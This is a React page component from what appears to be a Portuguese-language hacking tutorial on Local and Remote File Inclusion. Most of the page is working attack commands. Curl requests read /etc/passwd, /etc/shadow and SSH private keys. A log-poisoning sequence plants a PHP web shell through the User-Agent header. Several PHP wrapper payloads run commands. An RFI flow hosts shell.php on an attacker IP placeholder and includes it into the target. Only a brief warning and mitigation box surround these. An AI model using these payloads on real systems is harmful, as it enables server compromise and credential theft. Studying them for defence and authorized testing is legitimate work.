import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function LfiRfi() {
    return (
      <PageContainer
        title="LFI & RFI — Inclusão de Arquivos"
        subtitle="Local File Inclusion e Remote File Inclusion: ler arquivos do servidor ou executar código remotamente."
        difficulty="avancado"
        timeToRead="14 min"
      >
        <AlertBox type="danger" title="Vulnerabilidades críticas">
          LFI pode revelar arquivos de senhas, chaves privadas e configurações do servidor.
          RFI permite execução de código arbitrário. Teste apenas em sistemas autorizados.
        </AlertBox>

        <h2>O que é LFI?</h2>
        <p>
          LFI ocorre quando a aplicação inclui arquivos do servidor usando input do usuário sem validação.
          Exemplo: <code>?page=about.php</code> → <code>?page=../../../../etc/passwd</code>
        </p>

        <h2>Detecção de LFI</h2>
        <CodeBlock language="bash" code={'# Parâmetros comuns vulneráveis:\n# ?page=, ?file=, ?include=, ?path=, ?doc=, ?view=, ?template=\n\n# Teste básico\ncurl "https://app.com/?page=../../../../etc/passwd"\ncurl "https://app.com/?file=../../../etc/shadow"\ncurl "https://app.com/?include=../../../etc/hosts"\n\n# Com terminação nula (PHP < 5.4)\ncurl "https://app.com/?page=../../../../etc/passwd%00"\n\n# Usando filtros PHP (bypass de extensão)\ncurl "https://app.com/?page=php://filter/convert.base64-encode/resource=index.php"\n# Decodificar o resultado:\necho "PD9waHAK..." | base64 -d'} />

        <h2>Arquivos Interessantes para LFI</h2>
        <CodeBlock language="bash" code={'# Linux:\n/etc/passwd              # usuários do sistema\n/etc/shadow              # senhas (requer root)\n/etc/hosts               # hosts configurados\n/proc/self/environ       # variáveis de ambiente (pode ter credenciais)\n/proc/self/cmdline       # linha de comando do processo\n/var/log/apache2/access.log  # log de acesso (→ log poisoning)\n/var/log/auth.log        # log de autenticação\n~/.bash_history          # histórico do shell\n~/.ssh/id_rsa            # chave SSH privada\n\n# Windows:\nC:/Windows/System32/drivers/etc/hosts\nC:/Windows/win.ini\nC:/inetpub/wwwroot/web.config\n\n# Arquivos de config de apps comuns:\n/var/www/html/config.php\n/var/www/html/.env\n/etc/nginx/nginx.conf\n/etc/apache2/apache2.conf'} />

        <h2>LFI → RCE via Log Poisoning</h2>
        <CodeBlock language="bash" code={'# 1. Verificar se você pode ler o log de acesso\ncurl "https://app.com/?page=../../../../var/log/apache2/access.log"\n\n# 2. Injetar código PHP no log via User-Agent\ncurl -H "User-Agent: <?php system($_GET[\'cmd\']); ?>" https://app.com/\n\n# 3. Executar o código via LFI\ncurl "https://app.com/?page=../../../../var/log/apache2/access.log&cmd=id"\ncurl "https://app.com/?page=../../../../var/log/apache2/access.log&cmd=cat+/etc/passwd"'} />

        <h2>LFI com PHP Wrappers</h2>
        <CodeBlock language="bash" code={'# Ler código-fonte PHP em base64\ncurl "https://app.com/?page=php://filter/convert.base64-encode/resource=config.php"\n\n# Executar código com data:// wrapper\ncurl "https://app.com/?page=data://text/plain,<?php system(\'id\'); ?>"\ncurl "https://app.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="\n\n# Usar phar:// (requer upload)\ncurl "https://app.com/?page=phar://uploaded.jpg/shell"\n\n# expect:// (se módulo instalado)\ncurl "https://app.com/?page=expect://id"'} />

        <h2>RFI — Remote File Inclusion</h2>
        <CodeBlock language="bash" code={'# RFI: incluir arquivo de servidor externo\n# Requer: allow_url_include = On (raro mas existe)\n\n# 1. Criar shell PHP malicioso\necho "<?php system(\$_GET[\'cmd\']); ?>" > shell.php\n\n# 2. Hospedar com Python\npython3 -m http.server 8080\n\n# 3. Explorar RFI\ncurl "https://app.com/?page=http://SEU_IP:8080/shell.php&cmd=id"'} />

        <h2>Ferramentas para LFI</h2>
        <CodeBlock language="bash" code={'# LFImap — automatizar descoberta\ngit clone https://github.com/hansmach1ne/lfimap\npython3 lfimap/lfimap.py -U "https://app.com/?page=FILE" -a\n\n# Dotdotpwn — fuzzing de directory traversal\ndotdotpwn -m http -h app.com -f /etc/passwd\n\n# Burp Suite Intruder — fuzzing automático de payloads'} />

        <AlertBox type="warning" title="Mitigação">
          LFI/RFI são evitadas com: validação rígida de input, lista branca de arquivos permitidos,
          desabilitar allow_url_include, e não usar input do usuário diretamente em funções de inclusão.
        </AlertBox>
      </PageContainer>
    );
  }
  